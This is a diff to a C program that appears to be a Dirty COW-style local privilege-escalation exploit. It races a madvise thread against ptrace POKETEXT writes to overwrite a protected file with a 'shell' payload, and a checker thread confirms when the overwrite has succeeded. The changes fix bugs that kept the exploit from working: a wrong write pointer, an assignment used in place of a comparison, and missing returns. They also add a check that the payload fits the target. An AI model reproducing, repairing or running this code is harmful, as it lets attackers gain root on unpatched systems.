@@ -9,6 +9,7 @@
 #include <fcntl.h>
 #include <string.h>
 #include <errno.h>
+#include <wait.h>
 
 struct mem_arg {
   void *offset;
@@ -32,18 +33,18 @@ static void *checkthread(void *arg) {
     read (f, newdata, marg->patch_size);
     close(f);
 
-    printf("%s\n",newdata);
-    printf("%s\n",(char*)marg->patch);
+    //printf("%s\n",newdata);
+    //printf("%s\n",(char*)marg->patch);
 
 
     int cmp = memcmp(newdata, marg->patch, marg->patch_size);
-    printf("fdafdaf %d\n",cmp);
     if (cmp == 0) {
       marg->stop = 1;
       marg->success = 1;
     }
     usleep(100000);
   }
+  return NULL;
 }
 
 static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
@@ -53,12 +54,12 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
 
   d = dest;
   s = src;
-
+  
   while (n >= sizeof(long)) {
     memcpy(&value, s, sizeof(value));
 
     errno = 0;
-    if (ptrace(PTRACE_POKETEXT, pid, dest, value) == -1) {
+    if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
       printf("pof %d\n",errno);
       return -1;
     }
@@ -67,13 +68,14 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
     d += sizeof(long);
     s += sizeof(long);
 
+    //printf("%d\n",(int)d);
   }
 
   if (n > 0) {
     d -= sizeof(long) -n;
     errno = 0;
     value = ptrace(PTRACE_PEEKTEXT, pid, d, NULL);
-    if (value = -1 && errno != 0) {
+    if (value == -1 && errno != 0) {
       return -1;
     }
 
@@ -108,6 +110,8 @@ static void *madvthread(void *arg) {
   marg->stop = 1;
 
   printf("%d\n", c);
+
+  return NULL;
 }
 
 int main(int argc, const char *argv[]) {
@@ -129,6 +133,15 @@ int main(int argc, const char *argv[]) {
 
   size_t size = st.st_size;
 
+  if (size>st2.st_size) {
+    printf("Shell too long");
+    return 1;
+  }
+
+  //size_t orgsize = size;
+
+  //size = st2.st_size;
+  
   (*marg).patch = malloc(size);
   (*marg).patch_size = size;
 
@@ -158,7 +171,6 @@ int main(int argc, const char *argv[]) {
     pthread_create(&pt1, NULL, checkthread, marg);
     //printf("%ld\n",ptrace(PTRACE_ATTACH,pid));
     waitpid(pid,NULL,0);
-    printf("HGRAI\n");
     ptracethread((void*)marg);
     pthread_join(pt1,NULL);
   } else {
